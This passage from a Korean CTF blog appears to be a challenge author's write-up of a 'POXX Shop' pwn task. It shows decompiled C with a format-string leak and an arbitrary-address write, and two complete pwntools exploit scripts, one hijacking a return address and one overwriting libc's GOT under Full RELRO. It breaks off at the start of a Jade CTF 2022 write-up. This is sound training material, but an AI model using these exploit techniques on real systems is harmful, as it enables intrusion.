class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  _BYTE nptr[<span class="number">23</span>]; <span class="comment">// [rsp+29h] [rbp-17h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">15</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">176LL</span>);</span><br><span class="line">  buf = &amp;v4;</span><br><span class="line">  *(_QWORD *)nptr = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">7</span>] = <span class="number">0LL</span>;</span><br><span class="line">  initialize(argc, argv, <span class="number">8LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*** POXX Shop! ***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Buy&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Exchange&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Return&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What do you want for return?&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0xA0</span>uLL);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, It&#x27;s impossible.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">110</span>) )</span><br><span class="line">          <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">        v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">        v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        *v7 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>아래 1번 메뉴와 2번 메뉴에서 각각 취약점이 존재하며, 해당 취약점을 이용해서 익스플로잇 코드 작성이 가능하다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&#x27;n&#x27;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);            <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">  v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">  v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  *v7 = v8;                               <span class="comment">// aaw</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>먼저 1번 메뉴를 살펴보자. buf에 입력을 받고 <code>printf</code>로 출력을 해준다. 이 때 fsb가 발생하지만 ‘n’을 필터링하고 있기 때문에 스택 주소 leak만 가능하다.</p><p>2번 메뉴에서는 <code>*v7 = v8;</code> 이 구문을 통해 원하는 주소에 원하는 값을 쓸 수 있다. 다시 말해서 임의 주소 쓰기가 가능하다.</p><p>이때 <code>strtoul</code>을 이용해서 정수로 구성된 str을 unsigned long으로 바꿔준다. </p><p>v7에 0x7ffcea69ddf0를 넣고 싶다면? <code>read</code>에서 nptr에 해당 값을 입력해야한다. 그럼 <code>strtoul</code> 함수의 인자는 아래와 같이 들어가게 된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strtoul@plt (</span><br><span class="line">   $rdi = 0x007ffcea69de19 → &quot;140724241292784&quot;,</span><br><span class="line">   $rsi = 0x00000000000000,</span><br><span class="line">   $rdx = 0x0000000000000a</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>그리고 반환값은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x007ffcea69ddf0</span><br></pre></td></tr></table></figure><p>출제자의 입장에서 v7을 위한 nptr을 입력받을 때 왜 size가 0xF인 이유를 설명해보겠다. </p><p>보통 인텔 64bit에서 립시나 스택 주소는 0x7f로 시작하게 되고, 못해도 원하는 입력하고 싶은 주소의 범위는 아래와 같을 것이라고 생각했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f0000000000 ~ 0x7fffffffffff</span><br><span class="line">139637976727552 ~ 140737488355327</span><br></pre></td></tr></table></figure><p>이 값은 <code>strtoul</code> 함수에 의해 문자열(예를 들면 140737488355327)이 unsigned long으로 바뀌게 되므로, 입력하는 글자 수를 <code>len(&#39;140737488355327&#39;)=15</code>로 제한하게 되었다.</p><p>또한 v8을 위한 nptr 입력도 0x14로 특별히 제한한 이유가 있다. 이 글의 언인텐이 아닌 다음 글의 언인텐을 위해서다. (출제할 때부터 인지하고 있었던 언인텐이고 일부러 입력 크기를 0x14로 두고 언인텐을 방지하지 않았다.) </p><p>이에 관해서는 다음 글에서 설명하도록 한다.</p><h2 id="Vunlerability"><a href="#Vunlerability" class="headerlink" title="Vunlerability"></a>Vunlerability</h2><p>아무리 봐도 bof는 터지지 않는다. 임의 주소 쓰기와 스택 주소 leak을 이용하여 Exploit을 진행해보자.</p><p>스택에 있는 주소를 모두 출력할 수 있다는 것은 강력한 취약점이다. pie base, libc base, stack address 등을 바로 구할 수 있기 때문이다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>인텐과 언인텐 하나씩 소개한다. 인텐은 스택 ret를 gift 함수로 덮는 것이다. 이 문제는 예선 때 냈던 문제를 살짝 바꿔서 낸 문젠데 예선 때 풀어주신 분들이 모두 똑같은 방식(언인텐)으로 푸셔서 그 부분을 패치해서 냈다. </p><p>목표는 1. 패치를 통해 예선 때의 언인텐 풀이가 불가능 한 것, 2. 포너블 올클 방지 였다. 예선 때의 언인텐은 main 함수가 <code>return 0</code>으로 종료되어서 스택 ret를 gift함수 주소로 바꿔서 풀이하는 것이다. 이것을 방지하기 위해 main이 종료하는 부분을 <code>exit(0)</code>으로 변경하였다. 본선 문제를 풀이할 때 read 함수의 ret를 덮지 않고 풀이를 했으나 해당 방식은 익스하는데 오랜 시간이 걸려서 다른 익스 방식을 탐색하였다. 결국 예선 언인텐과 비슷한 방식의 풀이를 본선 인텐으로 채택하였다. 재밌는 것은 대회 끝나고 해당 문제를 풀이하려고 하신 분의 익스 코드를 살펴봤는데 이 방법이 아니라 다른 방법으로 시도하고 계셨다.. 이 방법도 해당 글에 소개하도록 하겠다.</p><h2 id="Exploit-Scnario-1-intend"><a href="#Exploit-Scnario-1-intend" class="headerlink" title="Exploit Scnario 1 (intend)"></a>Exploit Scnario 1 (intend)</h2><ol><li>stack address를 구한 뒤, loop 횟수 변경</li><li>pie base 구하기</li><li>buf를 read ret로 변경 후 gift 입력 (read ret를 gift)</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;43.201.142.219&#x27;, 49166)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">pause()</span><br><span class="line">Exchange(stack_leak + <span class="number">0xb8</span>, stack_leak - <span class="number">0x8</span>) <span class="comment"># buf -&gt; read ret</span></span><br><span class="line">Buy(p64(e.sym[<span class="string">&#x27;gift&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="loop-횟수-변경"><a href="#loop-횟수-변경" class="headerlink" title="loop 횟수 변경"></a>loop 횟수 변경</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1)</span><br><span class="line">b&#x27;\xff\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xf6\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xff\xff\xff\xff\xf6\xff\xff\xff&#x27;</span><br></pre></td></tr></table></figure><p>위 바이트 문자열을 long long int로 unpack하면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;q&#x27;, (struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)))</span><br><span class="line">(-38654705665,)</span><br></pre></td></tr></table></figure><p>참고로 굳이 loop 횟수를 변경하지 않아도 된다. 그 이유는 우리는 stack과 pie만 구하면 되는데 fsb가 터질 때 글자 수가 충분하기 때문이다.</p><h2 id="Exploit-Scnario-2"><a href="#Exploit-Scnario-2" class="headerlink" title="Exploit Scnario 2"></a>Exploit Scnario 2</h2><ol><li>stack address를 구한 뒤, loop 횟수 변경</li><li>libc base 구하기</li><li>pie base 구하기</li><li><code>*ABS*@got.plt</code>를 gift 함수 주소로 덮기 (got overwriting)</li></ol><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">pause()</span><br><span class="line">Buy(<span class="string">&#x27;%37$p_&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x23290</span></span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc.address)) <span class="comment"># libc base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [4]</span></span><br><span class="line">abs_got = libc.address + <span class="number">0x1d8050</span></span><br><span class="line">info(<span class="string">&#x27;abs got :: &#x27;</span> + <span class="built_in">hex</span>(abs_got))</span><br><span class="line"></span><br><span class="line">Exchange(abs_got, e.sym[<span class="string">&#x27;gift&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="GOT-overwriting"><a href="#GOT-overwriting" class="headerlink" title="GOT overwriting"></a>GOT overwriting</h3><p>Full RELRO임에도 GOT overwriting이 가능하다.</p><p>puts의 구현 초반부를 gdb에서 확인하면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ab33aa0 &lt;puts&gt;:       endbr64</span><br><span class="line">0x7fa31ab33aa4 &lt;puts+4&gt;:     push   r14</span><br><span class="line">0x7fa31ab33aa6 &lt;puts+6&gt;:     push   r13</span><br><span class="line">0x7fa31ab33aa8 &lt;puts+8&gt;:     push   r12</span><br><span class="line">0x7fa31ab33aaa &lt;puts+10&gt;:    mov    r12,rdi</span><br><span class="line">0x7fa31ab33aad &lt;puts+13&gt;:    push   rbp</span><br><span class="line">0x7fa31ab33aae &lt;puts+14&gt;:    push   rbx</span><br><span class="line">0x7fa31ab33aaf &lt;puts+15&gt;:    sub    rsp,0x10</span><br><span class="line">0x7fa31ab33ab3 &lt;puts+19&gt;:    call   0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;</span><br></pre></td></tr></table></figure><p><code>*ABS*+0x9d080@plt</code> 을 call하고 있는데, 안에 들어가서 확인해보면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;:  endbr64</span><br><span class="line">0x7fa31aae12b4 &lt;*ABS*+0x9d080@plt+4&gt;:        bnd jmp QWORD PTR [rip+0x1b5d95]        # 0x7fa31ac97050 &lt;*ABS*@got.plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vm 0x7fa31ac97050</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x007fa31ac97000 0x007fa31ac99000 0x000000001d8000 rw- /usr/lib/libc.so.6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>*ABS*@got.plt</code> 주소를 참조해서 jmp하므로 gift로 바꿔서 익스하면 될 듯 하다. 풀렐로 임에도 불구하고 쓰기 권한이 존재한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x00007fa31ac27920</span><br></pre></td></tr></table></figure><p>overwriting 후.. <code>*ABS*@got.plt</code> 주소에 gift 주소를 저장시킬 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x0000558eefe46257</span><br></pre></td></tr></table></figure><p>이 후에 <code>puts</code> 함수가 실행된다면 gift 함수가 실행될 것이다.</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>Demon 팀으로써 CTF 문제를 출제한 것 중에 가장 공을 들였고 오래걸렸다. 최신 libc를 가진 문제는 많이 풀이를 안해봐서 두 번째 익스 방법은 몰랐다. 새로운 것을 배워서 기분이 좋다 :) 이 문제 덕분에 최신 libc도 분석을 해보았는데 관련 내용은 Docs 카테고리에 (언젠간) 업뎃할 예정이다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> POXX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FULL RELRO </tag>
            
            <tag> Power Of XX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Guess game (Stack pivoting)</title>
      <link href="/221028-jadectf2022-guess_game/"/>
      <url>/221028-jadectf2022-guess_game/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(16&#x2F;630) solves</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chall</span><br><span class="line">└── libc.so.6</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span 